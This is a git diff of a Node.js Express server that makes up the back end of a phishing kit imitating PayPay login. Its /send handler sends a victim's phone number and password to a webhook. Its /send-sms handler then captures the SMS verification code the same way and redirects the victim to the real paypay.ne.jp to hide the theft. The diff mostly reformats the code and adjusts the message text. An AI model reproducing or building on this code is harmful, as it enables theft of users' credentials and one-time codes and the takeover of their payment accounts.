@@ -1,5 +1,4 @@
 const express = require("express");
-
 const app = express();
 
 app.use(express.urlencoded({ extended: true }));
@@ -25,16 +24,14 @@ app.post("/send", async (req, res) => {
       headers: {
         "Content-Type": "application/json"
       },
-            body: JSON.stringify({
-        content: `電話番号: ${phone}\nパスワード: ${password}`
-})
+      body: JSON.stringify({
+        content: `\n電話番号: ${phone}\nパスワード: ${password}`
+      })
     });
 
+    console.log("ログイン情報 送信成功");
 
-    const telParam = req.query.tel ? `?tel=${encodeURIComponent(req.query.tel)}` : '';
-    
-    console.log("送信成功");
-
+    const telParam = phone ? `?tel=${encodeURIComponent(phone)}` : '';
     res.redirect(`/sms.html${telParam}`);
 
   } catch (error) {
@@ -42,6 +39,7 @@ app.post("/send", async (req, res) => {
     res.status(500).send("エラー");
   }
 });
+
 
 app.post("/send-sms", async (req, res) => {
   const smsCode = req.body.sms_code;
@@ -54,13 +52,16 @@ app.post("/send-sms", async (req, res) => {
   try {
     await fetch(webhook, {
       method: "POST",
-      headers: { "Content-Type": "application/json" },
+      headers: {
+        "Content-Type": "application/json"
+      },
       body: JSON.stringify({
-        content: `【受信データ】\n認証コード: ${safeCode}`
+        content: `\n認証コード: ${safeCode}`
       })
     });
 
-    console.log("SMSコード送信成功");
+    console.log("SMSコード 送信成功");
+    
     res.redirect("https://paypay.ne.jp"); 
 
   } catch (error) {
